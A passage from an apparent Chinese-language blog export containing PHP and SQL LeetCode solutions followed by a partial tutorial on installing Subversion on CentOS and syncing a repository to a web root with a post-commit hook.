指针移到下一个结点</span></span><br><span class="line">            $node = $node-&gt;next;</span><br><span class="line">    </span><br><span class="line">            $l1 = $l1-&gt;next ?? <span class="keyword">null</span>;</span><br><span class="line">            $l2 = $l2-&gt;next ?? <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 最后一个计算溢位</span></span><br><span class="line">        <span class="keyword">if</span>($out &gt; <span class="number">0</span>)&#123;</span><br><span class="line">          $node-&gt;next = <span class="keyword">new</span> ListNode($out); </span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> $header-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="最大数"><a href="#最大数" class="headerlink" title="最大数"></a><a href="https://leetcode-cn.com/problems/largest-number/" target="_blank" rel="noopener">最大数</a></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123; </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer[] $nums</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">largestNumber</span><span class="params">($nums)</span> </span>&#123;</span><br><span class="line">     </span><br><span class="line">       <span class="keyword">if</span> (!is_array($nums)) <span class="keyword">return</span> <span class="string">''</span>; </span><br><span class="line">        $len = count($nums);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> ($j = $i + <span class="number">1</span>; $j &lt; $len; $j++) &#123;</span><br><span class="line">               </span><br><span class="line">                <span class="keyword">if</span> ( $nums[$i] . $nums[$j] &lt;  $nums[$j] . $nums[$i] ) &#123;</span><br><span class="line">                    </span><br><span class="line">                    $_tmp = $nums[$i];</span><br><span class="line">                    $nums[$i] = $nums[$j];</span><br><span class="line">                    $nums[$j] = $_tmp;</span><br><span class="line">                </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $ret =  implode($nums);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">empty</span>($ret[<span class="number">0</span>]) ? <span class="string">'0'</span> : $ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="无重复字符的最长子串"><a href="#无重复字符的最长子串" class="headerlink" title="无重复字符的最长子串"></a><a href="https://leetcode-cn.com/problems/longest-substring-without-repeating-characters/" target="_blank" rel="noopener">无重复字符的最长子串</a></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $s</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">lengthOfLongestSubstring</span><span class="params">($s)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">        $len = strlen($s);</span><br><span class="line">        </span><br><span class="line">        $p = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        $_tmp = <span class="string">""</span>; </span><br><span class="line">        </span><br><span class="line">        $max = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>($p &lt; $len)&#123; </span><br><span class="line">           </span><br><span class="line">           $target = $s[$p];</span><br><span class="line">           </span><br><span class="line">           $pos = strpos($_tmp,$target);</span><br><span class="line">            </span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">false</span> !== $pos) &#123;</span><br><span class="line"></span><br><span class="line">                $c = strlen($_tmp); </span><br><span class="line">               </span><br><span class="line">                $t =  $pos;</span><br><span class="line">               </span><br><span class="line">                $_tmp = substr($_tmp, $t-$c+<span class="number">1</span>,$c-$t<span class="number">-1</span>);  </span><br><span class="line">           &#125;</span><br><span class="line">      </span><br><span class="line">           $_tmp .= $target;</span><br><span class="line">            </span><br><span class="line">           $c = strlen($_tmp); </span><br><span class="line">            </span><br><span class="line">           <span class="keyword">if</span>( $c &gt; $max ) &#123;</span><br><span class="line">                $max = $c;</span><br><span class="line">           &#125; </span><br><span class="line">           $p++;</span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> $max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="寻找两个有序数组的中位数"><a href="#寻找两个有序数组的中位数" class="headerlink" title="寻找两个有序数组的中位数"></a><a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/" target="_blank" rel="noopener">寻找两个有序数组的中位数</a></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer[] $nums1</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer[] $nums2</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Float</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">findMedianSortedArrays</span><span class="params">($nums1, $nums2)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// define recursive function</span></span><br><span class="line">        $recursive = <span class="function"><span class="keyword">function</span> <span class="params">(array $nums1, int $i, array $nums2, int $j, int $k)</span> <span class="title">use</span> <span class="params">(&amp;$recursive)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>($nums1[$i]))</span><br><span class="line">                <span class="keyword">return</span> $nums2[$j + $k - <span class="number">1</span>];<span class="comment">//nums1为空数组</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>($nums2[$j]))</span><br><span class="line">                <span class="keyword">return</span> $nums1[$i + $k - <span class="number">1</span>];<span class="comment">//nums2为空数组</span></span><br><span class="line">            <span class="keyword">if</span> ($k == <span class="number">1</span>)<span class="comment">// 最后一次递归</span></span><br><span class="line">                <span class="keyword">return</span> min($nums1[$i], $nums2[$j]);</span><br><span class="line"></span><br><span class="line">            $k2 = intval($k / <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">            $midVal1 = $nums1[$i + $k2 - <span class="number">1</span>] ?? PHP_INT_MAX;</span><br><span class="line">            $midVal2 = $nums2[$j + $k2 - <span class="number">1</span>] ?? PHP_INT_MAX;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ($midVal1 &lt; $midVal2) &#123;</span><br><span class="line">                <span class="keyword">return</span> $recursive($nums1, $i + $k2, $nums2, $j, $k - $k2);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> $recursive($nums1, $i, $nums2, $j + $k2, $k - $k2);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// calc</span></span><br><span class="line">        $len = count($nums1) + count($nums2);</span><br><span class="line">        $left = $recursive($nums1, <span class="number">0</span>, $nums2, <span class="number">0</span>, intval($len + <span class="number">1</span>) / <span class="number">2</span>);</span><br><span class="line">        $right = $recursive($nums1, <span class="number">0</span>, $nums2, <span class="number">0</span>, intval($len + <span class="number">2</span>) / <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> ($left + $right) / <span class="number">2.0</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="最长回文子串"><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a><a href="https://leetcode-cn.com/problems/longest-palindromic-substring/" target="_blank" rel="noopener">最长回文子串</a></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123; </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $s</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">longestPalindrome</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">        $len = strlen($str);</span><br><span class="line">        $hlen = <span class="number">1</span>;</span><br><span class="line">        $start = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">            $l = $h = $i;</span><br><span class="line">            <span class="comment">// 下面两个while只可能有一个执行</span></span><br><span class="line">            <span class="keyword">while</span> ($h &lt; $len - <span class="number">1</span> &amp;&amp; $str[$l] == $str[$h + <span class="number">1</span>]) &#123;<span class="comment">// 非中心对称</span></span><br><span class="line">                $h++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (</span><br><span class="line">                $l &gt; <span class="number">0</span> &amp;&amp; $h &lt; $len - <span class="number">1</span> <span class="comment">// 边界</span></span><br><span class="line">                &amp;&amp; $str[$l - <span class="number">1</span>] == $str[$h + <span class="number">1</span>]<span class="comment">//  中心对称</span></span><br><span class="line">            ) &#123;</span><br><span class="line">                $l--;</span><br><span class="line">                $h++;</span><br><span class="line">            &#125;</span><br><span class="line">            $max = $h - $l + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ($hlen &lt; $max) &#123;</span><br><span class="line">                $hlen = $max;</span><br><span class="line">                $start = $l;</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> substr($str, $start, $hlen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Z-字形变换"><a href="#Z-字形变换" class="headerlink" title=" Z 字形变换"></a><a href="https://leetcode-cn.com/problems/zigzag-conversion/" target="_blank" rel="noopener"> Z 字形变换</a></h4><p>思路分析：</p>
<p>以 row = 5 为例，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1       9        17        25          33</span><br><span class="line">2    8 10     16 18     24 26       32 34</span><br><span class="line">3  7   11   15   19   23   27    31    35</span><br><span class="line">4 6    12 14     20 22     28 30       36</span><br><span class="line">5      13        21        29          37</span><br></pre></td></tr></table></figure>

<p>取出竖列</p>
<table>
<thead>
<tr>
<th align="left">k(第K行)\i(第i列)</th>
<th align="left">1</th>
<th align="left">2</th>
<th align="left">3</th>
<th align="left">4</th>
<th align="left">5</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">1</td>
<td align="left">9</td>
<td align="left">17</td>
<td align="left">25</td>
<td align="left">33</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">2</td>
<td align="left">10</td>
<td align="left">18</td>
<td align="left">26</td>
<td align="left">34</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">3</td>
<td align="left">11</td>
<td align="left">19</td>
<td align="left">27</td>
<td align="left">35</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">4</td>
<td align="left">12</td>
<td align="left">20</td>
<td align="left">28</td>
<td align="left">36</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">5</td>
<td align="left">13</td>
<td align="left">21</td>
<td align="left">29</td>
<td align="left">37</td>
</tr>
</tbody></table>
<p>可以得到竖列取值的规律:</p>
<ul>
<li>当 row != 1 时, m = k+2<em>(i-1)</em>(n-1),</li>
<li>当 row = 1 时,  m = i.</li>
</ul>
<p>其中 k ： 层级， i ： 列数，n ： 行数,  m：对应竖列上的值</p>
<p>分析每个数列中间值关系</p>
<table>
<thead>
<tr>
<th align="left">i</th>
<th align="left">k</th>
<th align="left">ans</th>
</tr>
</thead>
<tbody><tr>
<td align="left">2</td>
<td align="left">1</td>
<td align="left">m+8</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">2</td>
<td align="left">m+6</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">3</td>
<td align="left">m+4</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">4</td>
<td align="left">m+2</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">5</td>
<td align="left">m+0</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">*</td>
<td align="left">*</td>
</tr>
<tr>
<td align="left">i’</td>
<td align="left">n</td>
<td align="left">m+2(n-k) 中间值ans看着像和i是无关的，事实上是有关的，别忘了m的取值</td>
</tr>
</tbody></table>
<p>得出结论，中间值的规律：</p>
<ul>
<li>ans = m+2(n-k)</li>
</ul>
<p>算法实现如下 : </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">convert</span><span class="params">($str, $n)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $k = <span class="number">1</span>;</span><br><span class="line">        $tmp = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> ($n == <span class="number">1</span>) &#123;</span><br><span class="line">            $tmp = $str;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $strlen = strlen($str);</span><br><span class="line">            <span class="keyword">while</span> ($k &lt;= $n) &#123;</span><br><span class="line">                $i = <span class="number">1</span>;</span><br><span class="line">                $f = $n - $k;</span><br><span class="line">                <span class="keyword">while</span> ($i &lt;= $strlen) &#123;</span><br><span class="line">                    $m = $k + <span class="number">2</span> * ($i - <span class="number">1</span>) * ($n - <span class="number">1</span>);</span><br><span class="line">                    $ans = $m + <span class="number">2</span> * $f;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">empty</span>($str[$m - <span class="number">1</span>]))</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    $tmp .= $str[$m - <span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">if</span> ($f &gt; <span class="number">0</span> &amp;&amp; $f &lt; $n - <span class="number">1</span> &amp;&amp; !<span class="keyword">empty</span>($str[$ans - <span class="number">1</span>])) &#123;</span><br><span class="line">                        $tmp .= $str[$ans - <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                    $i++;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                $k++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="整数反转"><a href="#整数反转" class="headerlink" title="整数反转"></a><a href="https://leetcode-cn.com/problems/reverse-integer/" target="_blank" rel="noopener">整数反转</a></h4><p>法一: 栈思想</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $x</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Integer</span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reverse</span><span class="params">($x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $rev = <span class="number">0</span>;</span><br><span class="line">        $max = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) - <span class="number">1</span>;<span class="comment">// 最大值</span></span><br><span class="line">        $min = <span class="number">-1</span> &lt;&lt; <span class="number">31</span>;<span class="comment">// 最小值</span></span><br><span class="line">        <span class="keyword">if</span> ($x &gt; $max || $x &lt; $min) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 参数是否超出 </span></span><br><span class="line">        <span class="keyword">while</span> ($x != <span class="number">0</span>) &#123;</span><br><span class="line">            </span><br><span class="line">            $pop = $x % <span class="number">10</span>; <span class="comment">// 取最后一位数</span></span><br><span class="line"></span><br><span class="line">            $x = intval($x / <span class="number">10</span>);<span class="comment">// 降位</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 越界判断</span></span><br><span class="line">            <span class="keyword">if</span> ($rev &gt; $max / <span class="number">10</span> || ($rev == $max / <span class="number">10</span> &amp;&amp; $pop &gt; $max % <span class="number">10</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 正数</span></span><br><span class="line">            <span class="keyword">if</span> ($rev &lt; $min / <span class="number">10</span> || ($rev == $min / <span class="number">10</span> &amp;&amp; $pop &lt; $min % <span class="number">10</span>)) <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 负数</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 逆序升位</span></span><br><span class="line">            $rev = $rev * <span class="number">10</span> + $pop;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $rev;</span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>法二: 字符串反转</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $x</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Integer</span></span><br><span class="line"><span class="comment">     */</span> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">reverse</span><span class="params">($x)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $max = (<span class="number">1</span> &lt;&lt; <span class="number">31</span>) - <span class="number">1</span>;<span class="comment">// 最大值</span></span><br><span class="line">        $min = <span class="number">-1</span> &lt;&lt; <span class="number">31</span>;<span class="comment">// 最小值</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($x &gt; $max || $x &lt; $min) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">// 参数是否超出 </span></span><br><span class="line"></span><br><span class="line">        $is_negative = $x &lt; <span class="number">0</span> ? <span class="keyword">true</span> : <span class="keyword">false</span>; <span class="comment">// 正负判断</span></span><br><span class="line"></span><br><span class="line">        $x = $is_negative ? -$x : $x; <span class="comment">// 转成整数</span></span><br><span class="line"></span><br><span class="line">        $x = <span class="string">''</span> . $x; <span class="comment">// 转换成字符串 </span></span><br><span class="line"></span><br><span class="line">        $rev_str = $is_negative? <span class="string">'-'</span> : <span class="string">''</span> ; <span class="comment">// 保留符号</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ($len = strlen($x), $i = $len - <span class="number">1</span>; $i &gt;= <span class="number">0</span>; $i--) &#123; <span class="comment">// 逆转字符</span></span><br><span class="line">            $rev_str .= $x[$i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否越界输出</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span> == <span class="keyword">$this</span>-&gt;int_str_compare($rev_str, $is_negative ? $min : $max) ?  intval($rev_str) : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 数字字符串大小比较( 虽然 -1 &gt; -2,但是此处不考虑负数，所以 -1 &lt; -2)</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//  -1 表示 str1 &lt; str2</span></span><br><span class="line">    <span class="comment">//   0 表示 str1 = str2</span></span><br><span class="line">    <span class="comment">//   1 表示 str1 &gt; str2</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">int_str_compare</span><span class="params">($str1, $str2)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $len1 = strlen($str1 = <span class="string">''</span> . $str1);</span><br><span class="line">        $len2 = strlen($str2 = <span class="string">''</span> . $str2);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 长度对齐</span></span><br><span class="line">        <span class="keyword">if</span> ($len1 &gt; $len2) &#123;</span><br><span class="line">            $str2 = str_pad($str2, $len1, <span class="string">'0'</span>, STR_PAD_LEFT);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $str1 = str_pad($str1, $len2, <span class="string">'0'</span>, STR_PAD_LEFT);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $compare = <span class="number">0</span>;<span class="comment">// 大小比较</span></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>, $len = strlen($str1); $i &lt; $len; $i++) &#123;</span><br><span class="line">            $f = intval($str1[$i]) - intval($str2[$i]); <span class="comment">// 数字的每一位长度肯定不会超出0-9的范围，所以肯定不会超出</span></span><br><span class="line">            <span class="keyword">if</span> ($f &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                $compare = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">// 有一个比它大就全部比它大</span></span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($f &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                $compare = <span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">break</span>;<span class="comment">// 有一个比它小就全部比它小</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $compare = <span class="number">0</span>;<span class="comment">// 相等的话就继续比较下一位，直到最后以为相等才能说明str1等于str2</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> $compare;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SQL架构"><a href="#SQL架构" class="headerlink" title="SQL架构"></a>SQL架构</h3><h4 id="第二高的薪水"><a href="#第二高的薪水" class="headerlink" title="第二高的薪水"></a><a href="https://leetcode-cn.com/problems/second-highest-salary/" target="_blank" rel="noopener">第二高的薪水</a></h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">distinct</span>(Salary) <span class="keyword">from</span> Employee <span class="keyword">order</span> <span class="keyword">by</span> Salary <span class="keyword">DESC</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>) <span class="keyword">as</span> SecondHighestSalary</span><br></pre></td></tr></table></figure>

<h4 id="第N高的薪水"><a href="#第N高的薪水" class="headerlink" title="第N高的薪水"></a><a href="https://leetcode-cn.com/problems/nth-highest-salary/" target="_blank" rel="noopener">第N高的薪水</a></h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> getNthHighestSalary(N <span class="built_in">INT</span>) <span class="keyword">RETURNS</span> <span class="built_in">INT</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">  <span class="keyword">SET</span> N=N<span class="number">-1</span>;</span><br><span class="line">  RETURN (</span><br><span class="line">      <span class="keyword">select</span> (<span class="keyword">select</span> <span class="keyword">distinct</span>(Salary) <span class="keyword">from</span> Employee <span class="keyword">order</span> <span class="keyword">by</span> Salary <span class="keyword">DESC</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> N) <span class="keyword">as</span> getNthHighestSalary</span><br><span class="line">  );</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>

<h4 id="分数排名"><a href="#分数排名" class="headerlink" title="分数排名"></a><a href="https://leetcode-cn.com/problems/rank-scores/" target="_blank" rel="noopener">分数排名</a></h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a.Score,(<span class="keyword">select</span> <span class="keyword">count</span>(<span class="keyword">distinct</span>(b.Score)) <span class="keyword">from</span> Scores <span class="keyword">as</span> b <span class="keyword">where</span> b.Score&gt;a.Score)+<span class="number">1</span> <span class="keyword">as</span> <span class="keyword">Rank</span> <span class="keyword">FROM</span> Scores <span class="keyword">as</span> a <span class="keyword">ORDER</span> <span class="keyword">BY</span> Score <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>

<h4 id="连续出现的数字"><a href="#连续出现的数字" class="headerlink" title="连续出现的数字"></a><a href="https://leetcode-cn.com/problems/consecutive-numbers/" target="_blank" rel="noopener">连续出现的数字</a></h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> <span class="keyword">Num</span> <span class="keyword">as</span> ConsecutiveNums</span><br><span class="line"><span class="keyword">from</span> (</span><br><span class="line">  <span class="keyword">select</span> <span class="keyword">Num</span>, </span><br><span class="line">    <span class="keyword">case</span> </span><br><span class="line">      <span class="keyword">when</span> @prev = <span class="keyword">Num</span> <span class="keyword">then</span> @<span class="keyword">count</span> := @<span class="keyword">count</span> + <span class="number">1</span></span><br><span class="line">      <span class="keyword">when</span> (@prev := <span class="keyword">Num</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">then</span> @<span class="keyword">count</span> := <span class="number">1</span></span><br><span class="line">    <span class="keyword">end</span> <span class="keyword">as</span> CNT</span><br><span class="line">  <span class="keyword">from</span> <span class="keyword">Logs</span>, (<span class="keyword">select</span> @prev := <span class="literal">null</span>,@<span class="keyword">count</span> := <span class="literal">null</span>) <span class="keyword">as</span> t</span><br><span class="line">) <span class="keyword">as</span> temp</span><br><span class="line"><span class="keyword">where</span> temp.CNT &gt;= <span class="number">3</span></span><br></pre></td></tr></table></figure>

<p>不懂自定义变量的同学可以参考<a href="/articles/mysql中的用户变量/">mysql中的用户变量</a></p>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux安装svn及配置</title>
    <url>/articles/Linux%E5%AE%89%E8%A3%85svn%E5%8F%8A%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>centos6.4</p>
<h4 id="安装svn"><a href="#安装svn" class="headerlink" title="安装svn"></a>安装svn</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install subversion</span><br></pre></td></tr></table></figure>

<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>建立版本库目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir /www/svndata</span><br><span class="line"></span><br><span class="line">svnserve -d -r /www/svndata</span><br></pre></td></tr></table></figure>

<h4 id="建立版本库"><a href="#建立版本库" class="headerlink" title="建立版本库"></a>建立版本库</h4><p>创建一个新的Subversion项目</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">svnadmin create /var/www/svndata/njlrxx</span><br></pre></td></tr></table></figure>

<p>配置允许用户jiqing访问</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/svndata/njlrxx/conf</span><br><span class="line"></span><br><span class="line">vi svnserve.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">anon-access=none</span><br><span class="line"></span><br><span class="line">auth-access=write</span><br><span class="line"></span><br><span class="line">password-db=passwd</span><br></pre></td></tr></table></figure>

<p>注：修改的文件前面不能有空格，否则启动svn server出错</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi passwd</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[users]</span><br><span class="line"></span><br><span class="line">#&lt;用户1&gt; = &lt;密码1&gt;</span><br><span class="line"></span><br><span class="line">#&lt;用户2&gt; = &lt;密码2&gt;</span><br><span class="line"></span><br><span class="line">jiqing=123456</span><br></pre></td></tr></table></figure>

<h4 id="客户端连接"><a href="#客户端连接" class="headerlink" title="客户端连接"></a>客户端连接</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">svn co svn://ip/njlrxx</span><br><span class="line"></span><br><span class="line">用户名:jiqing</span><br><span class="line"></span><br><span class="line">密码：123456</span><br></pre></td></tr></table></figure>

<h4 id="实现SVN与WEB同步"><a href="#实现SVN与WEB同步" class="headerlink" title="实现SVN与WEB同步"></a>实现SVN与WEB同步</h4><ul>
<li><p>设置WEB服务器根目录为/var/www/webroot</p>
</li>
<li><p>checkout一份SVN</p>
</li>
</ul>
<p>svn co svn://localhost/njlrxx /var/www/webroot/njlrxx</p>
<p>修改权限为WEB用户 ( 否则无法远程up )</p>
<p>chown -R apache:apache /var/www/webroot/njlrxx</p>
<ul>
<li>建立同步脚本</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /var/www/svndata/njlrxx/hooks/</span><br><span class="line"></span><br><span class="line">cp post-commit.tmpl post-commit</span><br></pre></td></tr></table></figure>

<p>编辑post-commit,在文件最后添加以下内容</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REPOS=&quot;$1&quot;</span><br><span class="line"></span><br><span class="line">REV=&quot;$2&quot;</span><br><span class="line"></span><br><span class="line">BASEPATH=/var/www/webroot/njlrxx</span><br><span class="line"></span><br><span class="line">WEBPATH=&quot;$BASEPATH/&quot;</span><br><span class="line"></span><br><span class="line">export LANG=zh_CN.UTF-8</span><br><span class="line"></span><br><span class="line">svn update $WEBPATH --username jiqing --password 123456 --no-auth-cache</span><br></pre></td></tr></table></figure>

<p>增加脚本执行权限</p>
<p><code>chmod +x post-commit</code></p>
<p>最后操作是关闭服务然再打开服务:</p>
